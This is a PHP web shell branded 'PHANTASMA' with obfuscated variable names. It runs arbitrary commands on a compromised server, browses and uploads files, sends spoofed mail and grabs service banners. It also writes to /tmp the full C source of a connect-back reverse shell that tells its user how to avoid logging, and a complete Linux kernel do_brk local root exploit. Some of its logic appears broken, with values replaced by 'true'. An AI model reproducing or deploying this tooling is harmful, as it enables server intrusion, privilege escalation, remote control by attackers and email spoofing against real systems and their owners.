<?php
?>
<CENTER>
<DIV STYLE="font-family: verdana; font-size: 25px; font-weight: bold; color: #F3b700;">PHANTASMA- NeW CmD ;) </DIV>
<BR>
<DIV STYLE="font-family: verdana; font-size: 20px; font-weight: bold; color: #F3b700;">Informa��o do sistema</DIV>
<?php  echo '[syslog]01
'; $sp18fb26 = 'true'; $sp23c6d2 = phpversion(); $spea63b2 = 'true'; $spb30779 = 'true'; $spba592d = 'true'; if ($spde510b == '') { $spde510b = getcwd(); } ?>
<TABLE BORDER="0" CELLPADDING="0" CELLSPACING="0">
<?php  $sp6f9beb = 'true'; while (list($spea4fcd, $spc3da4d) = each($sp6f9beb)) { ?>
  <TR>
    <TD><DIV STYLE="font-family: verdana; font-size: 15px;"><?php  echo $spea4fcd; ?>
: <?php  echo $spc3da4d; ?>
</DIV></TD>
  </TR>
<?php  } ?>
 
  <TR>
   <TR>
    <TD><DIV STYLE="font-family: verdana; font-size: 15px;">Script Current User: <?php  echo $sp18fb26; ?>
</DIV></TD>
  </TR>
  <TR>
    <TD><DIV STYLE="font-family: verdana; font-size: 15px;">PHP Version: <?php  echo $sp23c6d2; ?>
</DIV></TD>
  </TR>
  <TR>
    <TD><DIV STYLE="font-family: verdana; font-size: 15px;">User Info: uid(<?php  echo $spea63b2; ?>
) euid(<?php  echo $spb30779; ?>
) gid(<?php  echo $spba592d; ?>
)</DIV></TD>
  </TR>
  <TR>
    <TD><DIV STYLE="font-family: verdana; font-size: 15px;">Current Path: <?php  echo $spde510b; ?>
</DIV></TD>
  </TR>
  <TR>
    <TD><DIV STYLE="font-family: verdana; font-size: 15px;">Server IP: <?php  $spa0dbfa = gethostbyname($spe9203a); echo $spa0dbfa; ?>
</DIV></TD>
  </TR>
   <TR>
    <TD><DIV STYLE="font-family: verdana; font-size: 15px;">Web Server: <?php  echo "{$sp48db21} {$sp446a22}"; ?>
</DIV></TD>
  </TR>
</TABLE>
<BR>
<?php  if ($sp7bd36a != '') { echo '<DIV STYLE="font-family: verdana; font-size: 15px;">[*] Command Mode Run</DIV>'; echo '[syslog]02
'; ?>

<DIV STYLE="font-family: verdana; font-size: 20px; font-weight: bold; color: #F3A700;">Command Stdout</DIV>
<?php  if ($spdb4689 == 1) { $spdb4689 = 'exec'; } if ($spdb4689 == '') { $spdb4689 = 'passthru'; } if ($spdb4689 == '2') { $spdb4689 = 'system'; } if (isset($spde510b)) { @chdir($spde510b); } ob_start(); $spdb4689("{$sp7bd36a}  2>&1"); $sp323b44 = ob_get_contents(); ob_end_clean(); ?>
<TEXTAREA COLS="75" ROWS="8" STYLE="font-family: verdana; font-size: 12px;">
<?php  if (!empty($sp323b44)) { echo str_replace('>', '&gt;', str_replace('<', '&lt;', $sp323b44)); } ?>
</TEXTAREA>
<BR>
<?php  echo '[syslog]03
'; } if ($sp867936 != '') { echo '<DIV STYLE="font-family: verdana; font-size: 15px;">[*] Safemode Mode Run</DIV>'; echo '[syslog]01
'; ?>
<DIV STYLE="font-family: verdana; font-size: 20px; font-weight: bold; color: #F3A700;">Safe Mode Directory Listing</DIV>
<?php  if ($spa25e24 = @opendir($spde510b)) { echo '<TABLE border=1 cellspacing=1 cellpadding=0>'; echo '<TR>'; echo '<TD valign=top>'; echo '<b><font size=2 face=arial>List All Files</b> <br><br>'; while (($spa3ecf0 = readdir($spa25e24)) !== false) { if (@is_file($spa3ecf0)) { $sp606535 = fileowner($spa3ecf0); $sp5355d0 = fileperms($spa3ecf0); echo "<font color=green>{$sp606535} - {$sp5355d0} - <a href={$sp0e6f18}?{$spa7e8ad}&see={$spa3ecf0}>{$spa3ecf0}</a><br>"; flush(); } } echo '</TD>'; echo '<TD valign=top>'; echo '<b><font size=2 face=arial>List Only Folders</b> <br><br>'; if ($spa25e24 = @opendir($spde510b)) { while (($spa3ecf0 = readdir($spa25e24)) !== false) { if (@is_dir($spa3ecf0)) { $sp606535 = fileowner($spa3ecf0); $sp5355d0 = fileperms($spa3ecf0); echo "<font color=blue>{$sp606535} - {$sp5355d0} - <a href={$sp0e6f18}?{$spa7e8ad}&chdir={$spde510b}/{$spa3ecf0}>{$spa3ecf0}</a><br>"; } } } echo '</TD>'; echo '<TD valign=top>'; echo '<b><font size=2 face=arial>List Writable Folders</b><br><br>'; if ($spa25e24 = @opendir($spde510b)) { while (($spa3ecf0 = readdir($spa25e24)) !== false) { if (@is_writable($spa3ecf0) && @is_dir($spa3ecf0)) { $sp606535 = fileowner($spa3ecf0); $sp5355d0 = fileperms($spa3ecf0); echo "<font color=red>{$sp606535} - {$sp5355d0} - {$spa3ecf0} </font><br>"; } } } echo '</TD>'; echo '</TD>'; echo '<TD valign=top>'; echo '<b><font size=2 face=arial>List Writable Files</b> <br><br>'; if ($spa25e24 = opendir($spde510b)) { while (($spa3ecf0 = readdir($spa25e24)) !== false) { if (@is_writable($spa3ecf0) && @is_file($spa3ecf0)) { $sp606535 = fileowner($spa3ecf0); $sp5355d0 = fileperms($spa3ecf0); echo "<font color=red>{$sp606535} - {$sp5355d0} - {$spa3ecf0} </font><br>"; } } } echo '</TD>'; echo '</TR>'; echo '</TABLE>'; } } echo '[syslog]04
'; if ($sp91772b == 'write') { $sp91772b = '#include <stdio.h>
' . '#include <sys/socket.h>
' . '#include <netinet/in.h>
' . '#include <arpa/inet.h>
' . '#include <netdb.h>
' . 'int main(int argc, char **argv) {
' . '  char *host;
' . '  int port = 80;
' . '  int f;
' . '  int l;
' . '  int sock;
' . '  struct in_addr ia;
' . '  struct sockaddr_in sin, from;
' . '  struct hostent *he;
' . '  char msg[ ] = "Welcome to Data Cha0s Connect Back Shell\\n\\n"
' . '                "Issue \\"export TERM=xterm; exec bash -i\\"\\n"
' . '                "For More Reliable Shell.\\n"
' . '                "Issue \\"unset HISTFILE; unset SAVEHIST\\"\\n"
' . '                "For Not Getting Logged.\\n(;\\n\\n";
' . '  printf("Data Cha0s Connect Back Backdoor\\n\\n");
' . '  if (argc < 2 || argc > 3) {
' . '    printf("Usage: %s [Host] <port>\\n", argv[0]);
' . '    return 1;
' . '  }
' . '  printf("[*] Dumping Arguments\\n");
' . '  l = strlen(argv[1]);
' . '  if (l <= 0) {
' . '    printf("[-] Invalid Host Name\\n");
' . '    return 1;
' . '  }
' . '  if (!(host = (char *) malloc(l))) {
' . '    printf("[-] Unable to Allocate Memory\\n");
' . '    return 1;
' . '  }
' . '  strncpy(host, argv[1], l);
' . '  if (argc == 3) {
' . '    port = atoi(argv[2]);
' . '    if (port <= 0 || port > 65535) {
' . '      printf("[-] Invalid Port Number\\n");
' . '      return 1;
' . '    }
' . '  }
' . '  printf("[*] Resolving Host Name\\n");
' . '  he = gethostbyname(host);
' . '  if (he) {
' . '    memcpy(&ia.s_addr, he->h_addr, 4);
' . '  } else if ((ia.s_addr = inet_addr(host)) == INADDR_ANY) {
' . '    printf("[-] Unable to Resolve: %s\\n", host);
' . '    return 1;
' . '  }
' . '  sin.sin_family = PF_INET;
' . '  sin.sin_addr.s_addr = ia.s_addr;
' . '  sin.sin_port = htons(port);
' . '  printf("[*] Connecting...\\n");
' . '  if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
' . '    printf("[-] Socket Error\\n");
' . '    return 1;
' . '  }
' . '  if (connect(sock, (struct sockaddr *)&sin, sizeof(sin)) != 0) {
' . '    printf("[-] Unable to Connect\\n");
' . '    return 1;
' . '  }
' . '  printf("[*] Spawning Shell\\n");
' . '  f = fork( );
' . '  if (f < 0) {
' . '    printf("[-] Unable to Fork\\n");
' . '    return 1;
' . '  } else if (!f) {
' . '    write(sock, msg, sizeof(msg));
' . '    dup2(sock, 0);
' . '    dup2(sock, 1);
' . '    dup2(sock, 2);
' . '    execl("/bin/sh", "shell", NULL);
' . '    close(sock);
' . '    return 0;
' . '  }
' . '  printf("[*] Detached\\n\\n");
' . '  return 0;
' . '}
'; $sp694629 = fopen('/tmp/dc-connectback.c', 'w'); $sp3cfe9e = fwrite($sp694629, $sp91772b); if (!empty($sp3cfe9e)) { echo '<DIV STYLE="font-family: verdana; font-size: 15px;">[*] Connect Back Shell Was Successfuly Copied</DIV>'; } else { echo '<DIV STYLE="font-family: verdana; font-size: 15px;">[-] An Error Has Ocurred While Copying Shell</DIV>'; } } if ($sp680e7d == 'write') { $sp680e7d = '/*
' . ' * hatorihanzo.c
' . ' * Linux kernel do_brk vma overflow exploit.
' . ' *
' . ' * The bug was found by Paul (IhaQueR) Starzetz <paul@isec.pl>
' . ' *
' . ' * Further research and exploit development by
' . ' * Wojciech Purczynski <cliph@isec.pl> and Paul Starzetz.
' . ' *
' . ' * (c) 2003 Copyright by IhaQueR and cliph. All Rights Reserved.
' . ' *
' . ' * COPYING, PRINTING, DISTRIBUTION, MODIFICATION, COMPILATION AND ANY USE
' . ' * OF PRESENTED CODE IS STRICTLY PROHIBITED.
' . '*/
' . '#define _GNU_SOURCE
' . '#include <stdio.h>
' . '#include <stdlib.h>
' . '#include <errno.h>
' . '#include <string.h>
' . '#include <unistd.h>
' . '#include <fcntl.h>
' . '#include <signal.h>
' . '#include <paths.h>
' . '#include <grp.h>
' . '#include <setjmp.h>
' . '#include <stdint.h>
' . '#include <sys/mman.h>
' . '#include <sys/ipc.h>
' . '#include <sys/shm.h>
' . '#include <sys/ucontext.h>
' . '#include <sys/wait.h>
' . '#include <asm/ldt.h>
' . '#include <asm/page.h>
' . '#include <asm/segment.h>
' . '#include <linux/unistd.h>
' . '#include <linux/linkage.h>
' . '#define kB   * 1024
' . '#define MB   * 1024 kB
' . '#define GB   * 1024 MB
' . '#define MAGIC             0xdefaced /* I should\'ve patented this number -cliph */
' . '#define ENTRY_MAGIC 0
' . '#define ENTRY_GATE 2
' . '#define ENTRY_CS    4
' . '#define ENTRY_DS    6
' . '#define CS          ((ENTRY_CS << 2) | 4)
' . '#define DS          ((ENTRY_DS << 2) | 4)
' . '#define GATE        ((ENTRY_GATE << 2) | 4 | 3)
' . '#define LDT_PAGES   ((LDT_ENTRIES*LDT_ENTRY_SIZE+PAGE_SIZE-1) / PAGE_SIZE)
' . '#define TOP_ADDR    0xFFFFE000U
' . '/* configuration */
' . 'unsigned     task_size;
' . 'unsigned     page;
' . 'uid_t        uid;
' . 'unsigned     address;
' . 'int dontexit = 0;
' . 'void fatal(char * msg)
' . '{
' . '      fprintf(stderr, "[-] %s: %s\\n", msg, strerror(errno));
' . '      if (dontexit) {
' . '             fprintf(stderr, "[-] Unable to exit, entering neverending loop.\\n");
' . '             kill(getpid(), SIGSTOP);
' . '             for (;;) pause();
' . '      }
' . '      exit(EXIT_FAILURE);
' . '}
' . 'void configure(void)
' . '{
' . '      unsigned val;
' . '      task_size = ((unsigned)&val + 1 GB ) / (1 GB) * 1 GB;
' . '      uid = getuid();
' . '}
' . 'void expand(void)
' . '{
' . '      unsigned top = (unsigned) sbrk(0);
' . '      unsigned limit = address + PAGE_SIZE;
' . '      do {
' . '             if (sbrk(PAGE_SIZE) == NULL)
' . '                   fatal("Kernel seems not to be vulnerable");
' . '             dontexit = 1;
' . '             top += PAGE_SIZE;
' . '      } while (top < limit);
' . '}
' . 'jmp_buf jmp;
' . '#define MAP_NOPAGE 1
' . '#define MAP_ISPAGE 2
' . 'void sigsegv(int signo, siginfo_t * si, void * ptr)
' . '{
' . '      struct ucontext * uc = (struct ucontext *) ptr;
' . '      int error_code = uc->uc_mcontext.gregs[REG_ERR];
' . '      (void)signo;
' . '      (void)si;
' . '      error_code = MAP_NOPAGE + (error_code & 1);
' . '      longjmp(jmp, error_code);
' . '}
' . 'void prepare(void)
' . '{
' . '      struct sigaction sa;
' . '      sa.sa_sigaction = sigsegv;
' . '      sa.sa_flags = SA_SIGINFO | SA_NOMASK;
' . '      sigemptyset(&sa.sa_mask);
' . '      sigaction(SIGSEGV, &sa, NULL);
' . '}
' . 'int testaddr(unsigned addr)
' . '{
' . '      int val;
' . '      val = setjmp(jmp);
' . '      if (val == 0) {
' . '             asm ("verr (%%eax)" : : "a" (addr));
' . '             return MAP_ISPAGE;
' . '      }
' . '      return val;
' . '}
' . '#define map_pages (((TOP_ADDR - task_size) + PAGE_SIZE - 1) / PAGE_SIZE)
' . '#define map_size (map_pages + 8*sizeof(unsigned) - 1) / (8*sizeof(unsigned))
' . '#define next(u, b) do { if ((b = 2*b) == 0) { b = 1; u++; } } while(0)
' . 'void map(unsigned * map)
' . '{
' . '      unsigned addr = task_size;
' . '      unsigned bit = 1;
' . '      prepare();
' . '      while (addr < TOP_ADDR) {
' . '             if (testaddr(addr) == MAP_ISPAGE)
' . '                   *map |= bit;
' . '             addr += PAGE_SIZE;
' . '             next(map, bit);
' . '      }
' . '      signal(SIGSEGV, SIG_DFL);
' . '}
' . 'void find(unsigned * m)
' . '{
' . '      unsigned addr = task_size;
' . '      unsigned bit = 1;
' . '      unsigned count;
' . '      unsigned tmp;
' . '      prepare();
' . '      tmp = address = count = 0U;
' . '      while (addr < TOP_ADDR) {
' . '             int val = testaddr(addr);
' . '             if (val == MAP_ISPAGE && (*m & bit) == 0) {
' . '                   if (!tmp) tmp = addr;
' . '                   count++;
' . '             } else {
' . '                   if (tmp && count == LDT_PAGES) {
' . '                          errno = EAGAIN;
' . '                          if (address)
' . '                                fatal("double allocation\\n");
' . '                          address = tmp;
' . '                   }
' . '                   tmp = count = 0U;
' . '             }
' . '             addr += PAGE_SIZE;
' . '             next(m, bit);
' . '      }
' . '      signal(SIGSEGV, SIG_DFL);
' . '      if (address)
' . '             return;
' . '      errno = ENOTSUP;
' . '      fatal("Unable to determine kernel address");
' . '}
' . 'int modify_ldt(int, void *, unsigned);
' . 'void ldt(unsigned * m)
' . '{
' . '      struct modify_ldt_ldt_s l;
' . '      map(m);
' . '      memset(&l, 0, sizeof(l));
' . '      l.entry_number = LDT_ENTRIES - 1;
' . '      l.seg_32bit = 1;
' . '      l.base_addr = MAGIC >> 16;
' . '      l.limit = MAGIC & 0xffff;
' . '      if (modify_ldt(1, &l, sizeof(l)) == -1)
' . '             fatal("Unable to set up LDT");
' . '      l.entry_number = ENTRY_MAGIC / 2;
' . '      if (modify_ldt(1, &l, sizeof(l)) == -1)
' . '             fatal("Unable to set up LDT");
' . '      find(m);
' . '}
' . 'asmlinkage void kernel(unsigned * task)
' . '{
' . '      unsigned * addr = task;
' . '      /* looking for uids */
' . '      while (addr[0] != uid || addr[1] != uid ||
' . '             addr[2] != uid || addr[3] != uid)
' . '             addr++;
' . '      addr[0] = addr[1] = addr[2] = addr[3] = 0;    /* uids */
' . '      addr[4] = addr[5] = addr[6] = addr[7] = 0;    /* uids */
' . '      addr[8] = 0;
' . '      /* looking for vma */
' . '      for (addr = (unsigned *) task_size; addr; addr++) {
' . '             if (addr[0] >= task_size && addr[1] < task_size &&
' . '                 addr[2] == address && addr[3] >= task_size) {
' . '                   addr[2] = task_size - PAGE_SIZE;
' . '                   addr = (unsigned *) addr[3];
' . '                   addr[1] = task_size - PAGE_SIZE;
' . '                   addr[2] = task_size;
' . '                   break;
' . '             }
' . '      }
' . '}
' . 'void kcode(void);
' . '#define __str(s) #s
' . '#define str(s) __str(s)
' . 'void __kcode(void)
' . '{
' . '      asm(
' . '             "kcode:                                \\n"
' . '             "     pusha                            \\n"
' . '             "     pushl %es                        \\n"
' . '             "     pushl %ds                        \\n"
' . '             "     movl   $(" str(DS) ") ,%edx      \\n"
' . '             "     movl   %edx,%es                  \\n"
' . '             "     movl   %edx,%ds                  \\n"
' . '             "     movl   $0xffffe000,%eax          \\n"
' . '             "     andl   %esp,%eax                 \\n"
' . '             "     pushl %eax                       \\n"
' . '             "     call   kernel                    \\n"
' . '             "     addl   $4, %esp                  \\n"
' . '             "     popl   %ds                       \\n"
' . '             "     popl   %es                       \\n"
' . '             "     popa                             \\n"
' . '             "     lret                             \\n"
' . '      );
' . '}
' . 'void knockout(void)
' . '{
' . '      unsigned * addr = (unsigned *) address;
' . '      if (mprotect(addr, PAGE_SIZE, PROT_READ|PROT_WRITE) == -1)
' . '             fatal("Unable to change page protection");
' . '      errno = ESRCH;
' . '      if (addr[ENTRY_MAGIC] != MAGIC)
' . '             fatal("Invalid LDT entry");
' . '      /* setting call gate and privileged descriptors */
' . '      addr[ENTRY_GATE+0] = ((unsigned)CS << 16) | ((unsigned)kcode & 0xffffU);
' . '      addr[ENTRY_GATE+1] = ((unsigned)kcode & ~0xffffU) | 0xec00U;
' . '      addr[ENTRY_CS+0] = 0x0000ffffU; /* kernel 4GB code at 0x00000000 */
' . '      addr[ENTRY_CS+1] = 0x00cf9a00U;
' . '      addr[ENTRY_DS+0] = 0x0000ffffU; /* user   4GB code at 0x00000000 */
' . '      addr[ENTRY_DS+1] = 0x00cf9200U;
' . '      prepare();
' . '      if (setjmp(jmp) != 0) {
' . '             errno = ENOEXEC;
' . '             fatal("Unable to jump to call gate");
' . '      }
' . '      asm("lcall $" str(GATE) ",$0x0");      /* this is it */
' . '}
' . 'void shell(void)
' . '{
' . '      char * argv[] = { _PATH_BSHELL, NULL };
' . '      execve(_PATH_BSHELL, argv, environ);
' . '      fatal("Unable to spawn shell\\n");
' . '}
' . 'void remap(void)
' . '{
' . '      static char stack[8 MB];  /* new stack */
' . '      static char * envp[] = { "PATH=" _PATH_STDPATH, NULL };
' . '      static unsigned * m;
' . '      static unsigned b;
' . '      m = (unsigned *) sbrk(map_size);
' . '      if (!m)
' . '             fatal("Unable to allocate memory");
' . '      environ = envp;
' . '      asm ("movl %0, %%esp\\n" : : "a" (stack + sizeof(stack)));
' . '      b = ((unsigned)sbrk(0) + PAGE_SIZE - 1) & PAGE_MASK;
' . '      if (munmap((void*)b, task_size - b) == -1)
' . '             fatal("Unable to unmap stack");
' . '      while (b < task_size) {
' . '             if (sbrk(PAGE_SIZE) == NULL)
' . '                   fatal("Unable to expand BSS");
' . '             b += PAGE_SIZE;
' . '      }
' . '      ldt(m);
' . '      expand();
' . '      knockout();
' . '      shell();
' . '}
' . 'int main(void)
' . '{
' . '      configure();
' . '      remap();
' . '      return EXIT_FAILURE;
' . '}
'; $sp694629 = fopen('/tmp/xpl_brk.c', 'w'); $sp3cfe9e = fwrite($sp694629, $sp680e7d); if (!empty($sp3cfe9e)) { echo '<DIV STYLE="font-family: verdana; font-size: 15px;">[*] Linux Local Kernel Exploit Was Successfuly Copied</DIV>'; } else { echo '<DIV STYLE="font-family: verdana; font-size: 15px;">[-] An Error Has Ocurred While Copying Kernel Exploit</DIV>'; } } ?>
</CENTER>
<pre><font face="Tahoma" size="2">
<?php  if ($sp4a155a != '') { $sp694629 = fopen($sp4a155a, 'r'); $sp437738 = fread($sp694629, 30000); echo "============== {$sp4a155a} ================<br>"; echo '<textarea name=textarea cols=80 rows=15>'; echo "{$sp437738}"; echo '</textarea>'; } if ($sp121263 != '') { $sp694629 = @fopen("{$spa350be}", r); $sp71a800 = @fopen("{$spac0142}", 'w'); fwrite($sp71a800, ''); $spe49222 = @fopen("{$spac0142}", 'a+'); for (;;) { $sp437738 = @fread($sp694629, 4096); if (empty($sp437738)) { break; } $sp3cfe9e = fwrite($spe49222, $sp437738); if (empty($sp3cfe9e)) { echo '<DIV STYLE="font-family: verdana; font-size: 15px;">[-] An Error Has Ocurred While Uploading File</DIV>'; break; } } if (!empty($sp3cfe9e)) { echo '<DIV STYLE="font-family: verdana; font-size: 15px;">[*] File Was Successfuly Uploaded</DIV>'; } } flush(); echo '[syslog]05
'; if ($sp75a938 != '') { $sp38b484 = show_source("{$sp75a938}"); echo "<font size=4> {$sp38b484} </font>"; } if ($sp4e6d9b != '') { $sp4617d0 = stat("{$sp2793f4}"); while (list($spea4fcd, $spc3da4d) = each($sp4617d0)) { echo " Info: {$spea4fcd}  Value: {$spc3da4d} <br>"; } } if ($spc463fb == 1) { echo "<FORM METHOD=POST ACTION=\"{$sp0e6f18}?{$spa7e8ad}&send=1\">"; echo 'Your Fake Mail <INPUT TYPE="" NAME="yourmail"><br>'; echo 'Your Cavy:<INPUT TYPE="" NAME="cavy"><br>'; echo 'Suject: <INPUT TYPE="text" NAME="subject"><br>'; echo 'Text: <TEXTAREA NAME="body" ROWS="" COLS=""></TEXTAREA><br>'; echo '<INPUT TYPE="hidden" NAME="send" VALUE="1"><br>'; echo '<INPUT TYPE="submit" VALUE="Send Fake Mail">'; echo '</FORM>'; } if ($sp09b72f == 1) { if (mail($spcd00b7, $spc4843d, $sp15a5cb, "From: {$sp7fbf3a}\r\n")) { echo '<DIV STYLE="font-family: verdana; font-size: 15px;">[*] Mail Send Sucessfuly</DIV>'; } else { echo '<DIV STYLE="font-family: verdana; font-size: 15px;">[-] An Error Has Ocurred While Sending Mail</DIV>'; } } if ($sp15cc20 != '') { $sp2d79fe = array('21', '22', '23', '25', '110'); $spe99d03 = count($sp2d79fe); for ($spdd6db5 = 0; $spdd6db5 < $spe99d03; $spdd6db5++) { @($spfe78c5[$spdd6db5] = Fsockopen($spe9203a, $sp2d79fe[$spdd6db5], $sp1897dc, $sp37acbd, 1)); $sp970a8f = Getservbyport($sp2d79fe[$spdd6db5], 'tcp'); @($sp11b7a4 = fgets($spfe78c5[$spdd6db5])); echo "<br>Port: {$sp2d79fe[$spdd6db5]} - Service: {$sp970a8f}<br><br>"; echo "<br>Banner: {$sp11b7a4} <br><br>"; flush(); } } echo '[syslog]06
'; ?>
 
</font></pre><?php 